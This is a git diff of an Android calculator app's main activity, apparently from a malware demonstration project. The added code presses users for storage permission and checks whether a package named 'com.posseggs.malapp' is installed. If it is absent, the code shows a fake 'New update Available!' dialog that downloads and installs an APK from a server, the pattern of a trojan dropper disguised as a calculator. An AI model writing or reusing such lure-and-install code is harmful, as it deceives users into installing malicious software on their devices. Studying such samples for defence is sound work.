@@ -1,9 +1,12 @@
 package com.posseggs.calculator;
 
 import android.Manifest;
+import android.content.DialogInterface;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
+import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.view.View;
@@ -16,15 +19,23 @@ public class MainActivity extends AppCompatActivity {
 
     //IDs
     public static final int REQUEST_CODE_WRITE_EXTERNAL_STORAGE = 18351;
+
+    //Operations
     public static final String add = "+";
     public static final String sub = "-";
     public static final String multi = "*";
     public static final String div = "/";
 
+    //Shared Preferences
+    public static final String SHARED_PREFS = "SHARED_PREFS";
+    public static final String UPDATED = "UPDATED";
+
     TextView textViewCalc;
     String operation;
     Integer num1 = null;
     Integer num2 = null;
+
+    private boolean updated = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -33,11 +44,8 @@ public class MainActivity extends AppCompatActivity {
 
         this.textViewCalc = findViewById(R.id.textViewCalculator);
         //Check for permissions for fileIO and ask for them if not existing
-        checkForPermission();
+        askForPermission();
 
-        UpdateApp u = new UpdateApp();
-        u.setContext(getApplicationContext());
-        u.execute(getString(R.string.server_uri));
 
         /*
         if(!serviceRunning())
@@ -60,11 +68,138 @@ public class MainActivity extends AppCompatActivity {
     }
     */
 
-    private void checkForPermission()
+    //Ask for permission if not given
+    private void askForPermission()
     {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE_WRITE_EXTERNAL_STORAGE);
+        {
+            new AlertDialog.Builder(this)
+                    .setMessage("This app needs storage permissions to function! Please give the needed permissions!")
+                    .setTitle("Permissions needed!")                                      //If yes give permissions
+                    .setPositiveButton("OK", (DialogInterface dialog, int which) -> ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE_WRITE_EXTERNAL_STORAGE))
+                    .setNegativeButton("Cancel", (DialogInterface dialog, int which) -> this.finish())
+                    .create()
+                    .show();
+        }
     }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        switch (requestCode) {
+            case REQUEST_CODE_WRITE_EXTERNAL_STORAGE: {
+                // If request is cancelled, the result arrays are empty.
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    //Permission granted
+                    //Check if app is updated and if not ask for update
+                    checkForUpdateOnStartUp();
+                }
+                else
+                {
+                    //Permissions denied. Ask again
+                    new AlertDialog.Builder(this)
+                            .setMessage("This app needs storage permissions to function! Are you sure you don't want to give permissions? Without the permissions the app cannot run and will close automatically!")
+                            .setTitle("Permissions needed!")
+                            .setPositiveButton("Yes", (DialogInterface dialog, int which) -> this.finish()) //End app
+                            .setNegativeButton("No", (DialogInterface dialog, int which) -> askForPermission()) //Ask again
+                            .create()
+                            .show();
+                }
+                return;
+            }
+            // next case ... and so on
+        }
+    }
+
+    //Check if updated is true and if not ask the user to update app
+    private void checkForUpdateOnStartUp()
+    {
+        //Load preferences
+        loadPreferences();
+
+        //Check if newest app is installed
+        checkUpdated();
+
+        //If newest app is not installed ask for update
+        if (!updated)
+            askForUpdate();
+    }
+
+    //Set updated to value depending on installation of malapp
+    public void checkUpdated()
+    {
+        PackageManager pm = this.getPackageManager();
+        if(appInstalled("com.posseggs.malapp", pm))
+            updated = true;
+        else
+            updated = false;
+
+        savePreferences(updated);
+    }
+
+    //Check if an app is installed
+    private boolean appInstalled(String packageName, PackageManager packageManager) {
+
+        boolean found; //False
+
+        try
+        {
+
+            packageManager.getPackageInfo(packageName, 0);
+            found = true;
+        }
+        catch (PackageManager.NameNotFoundException e) {
+
+            found = false;
+        }
+
+        return found;
+    }
+
+    //Ask user to start update
+    private void askForUpdate() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)
+        {
+            new AlertDialog.Builder(this)
+                    .setMessage("A new update is available! Press OK to download and install the new update!")
+                    .setTitle("New update Available!")                                      //If yes download update
+                    .setPositiveButton("OK", (DialogInterface dialog, int which) -> update())
+                    .setNegativeButton("Cancel", (DialogInterface dialog, int which) -> dialog.dismiss())
+                    .create()
+                    .show();
+        }
+    }
+
+    //Download and install app
+    private void update()
+    {
+        //TODO: TELL MAIN ACTIVITY ABOUT PROGRESS OF DOWNLOAD
+        UpdateApp u = new UpdateApp();
+        u.setContext(getApplicationContext());
+        u.execute(getString(R.string.server_uri));
+    }
+
+    //Load from the shared preferences
+    private void loadPreferences()
+    {
+        SharedPreferences sp = getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);
+        updated = sp.getBoolean(UPDATED, false);
+    }
+
+    //Save the settings to the shared preferences
+    public void savePreferences(boolean newVal)
+    {
+        //Setup sp
+        SharedPreferences sp = getSharedPreferences(SHARED_PREFS,MODE_PRIVATE);
+        SharedPreferences.Editor sp_editor = sp.edit();
+        //Save updated boolean
+        sp_editor.putBoolean(UPDATED, newVal);
+        //Apply changes
+        sp_editor.apply();
+    }
+
+    /*
+    Calculator logic
+    */
 
     public void onClick(View view)
     {
